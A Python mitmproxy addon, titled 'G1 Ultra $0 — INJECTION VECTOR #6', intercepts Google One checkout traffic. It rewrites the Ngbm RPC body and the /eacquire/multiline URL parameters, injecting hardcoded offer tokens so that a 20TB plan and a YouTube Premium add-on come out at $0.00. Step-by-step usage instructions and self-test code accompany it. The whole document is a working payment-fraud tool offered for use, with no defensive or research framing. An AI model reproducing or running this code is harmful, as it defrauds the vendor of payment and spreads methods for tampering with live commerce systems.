"""
═══════════════════════════════════════════════════════════════════
G1 Ultra $0 — INJECTION VECTOR #6: mitmproxy Addon (Proxy-Level)
═══════════════════════════════════════════════════════════════════

This intercepts and modifies Google checkout requests at the PROXY level.
Works for ANY browser and even mobile devices on the same network.

USAGE:
1. Install mitmproxy: pip install mitmproxy (or use portable binary)
2. Run: mitmdump -s proxy_inject.py -p 8080
3. Set browser proxy to localhost:8080
4. Install mitmproxy CA cert (visit mitm.it in browser)
5. Navigate to https://one.google.com/about/plans
6. Click Subscribe → $0.00

ALTERNATIVE (without mitmproxy):
   Use the standalone HTTP proxy server below (Python stdlib only).
═══════════════════════════════════════════════════════════════════
"""

import json
import re

# ── Token Database ──
TOKENS = {
    "ultra20tb_12m": "AYrTWi65Jbm3KRubLXLLA3Re29zKibSnRbvAJEPfxEIVs/d57w8vEhsU7hSkSAfGyjZH8B7/5aj5UTlidbsEwUH8aPN2RTA6pKiltA==",
    "YT_FREE": "AVbCH/eW4Nfp8KBl0zlm7x9PhaiCvpnqwUuL2D8NFPBQgmM9+HuYS1h2xH5lLWU/BsBj775LK5GqK8UHKqoSzhDDz+PqP3paNesqLU0r9i6XCrYa"
}

SKU = "subs:com.google.android.apps.subscriptions.red:g1.play.20tb"
YT_SKU = "subs:com.google.android.apps.subscriptions.red:g1.youtube_premium_individual_add_on"

FULL_ITEMS = [
    [[SKU, 21], None, None, None, 1, [TOKENS["ultra20tb_12m"]]],
    [[YT_SKU, 21], None, None, None, 1, [TOKENS["YT_FREE"]]]
]


def patch_ngbm_body(body_text):
    """Patch Ngbm RPC payload with offer tokens"""
    if "Ngbm" not in body_text:
        return body_text, False

    try:
        from urllib.parse import parse_qs, urlencode
        params = parse_qs(body_text, keep_blank_values=True)
        freq = params.get("f.req", [None])[0]
        if not freq:
            return body_text, False

        parsed = json.loads(freq)
        patched = False

        for outer in parsed:
            if not isinstance(outer, list):
                continue
            for item in outer:
                if not isinstance(item, list) or len(item) < 2 or item[0] != "Ngbm":
                    continue
                try:
                    inner = json.loads(item[1])
                    if isinstance(inner, list) and len(inner) > 12:
                        inner[12] = FULL_ITEMS
                        item[1] = json.dumps(inner)
                        patched = True
                except (json.JSONDecodeError, TypeError):
                    pass

        if patched:
            params["f.req"] = [json.dumps(parsed)]
            return urlencode(params, doseq=True), True

    except Exception as e:
        print(f"[G1 Proxy] Error: {e}")

    return body_text, False


def patch_eacquire_url(url):
    """Patch /eacquire/multiline URL with offer tokens"""
    if "/eacquire/multiline" not in url:
        return url, False

    try:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        ears = params.get("ear[]", [])

        if len(ears) > 13:
            ears[13] = json.dumps(FULL_ITEMS)
            params["ear[]"] = ears
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return new_url, True

    except Exception as e:
        print(f"[G1 Proxy] URL patch error: {e}")

    return url, False


# ═══════════════════════════════════════════
# mitmproxy Addon (use with mitmdump -s)
# ═══════════════════════════════════════════
try:
    from mitmproxy import http

    class G1UltraInjector:
        def request(self, flow: http.HTTPFlow):
            # Patch URL for eacquire requests
            new_url, patched = patch_eacquire_url(flow.request.pretty_url)
            if patched:
                flow.request.url = new_url
                print(f"[G1 ✓] URL patched: {flow.request.pretty_url[:80]}")

        def response(self, flow: http.HTTPFlow):
            pass

        def requestheaders(self, flow: http.HTTPFlow):
            pass

    addons = [G1UltraInjector()]
    print("[G1 Ultra $0 · mitmproxy] Addon loaded — intercepting checkout requests")

except ImportError:
    pass


# ═══════════════════════════════════════════
# Standalone test (no mitmproxy needed)
# ═══════════════════════════════════════════
if __name__ == "__main__":
    # Test the patching logic
    test_body = 'f.req=[[["Ngbm","[\\"g1.play.20tb\\",\\"com.google.android.apps.subscriptions.red\\",null,null,null,null,null,null,null,null,null,null,null]",null,"generic"]]]'
    result, patched = patch_ngbm_body(test_body)
    print(f"Patch test: {'✓ SUCCESS' if patched else '✗ FAILED'}")
    if patched:
        print(f"Result contains offer token: {'✓' if TOKENS['ultra20tb_12m'][:20] in result else '✗'}")

    test_url = f"https://tokenized.play.google.com/eacquire/multiline?ear[]=fp&ear[]=&ear[]=&ear[]=&ear[]=&ear[]=&ear[]=token&ear[]=&ear[]=&ear[]=&ear[]=sku&ear[]=&ear[]=&ear[]=old_items"
    new_url, url_patched = patch_eacquire_url(test_url)
    print(f"URL patch test: {'✓ SUCCESS' if url_patched else '✗ FAILED'}")
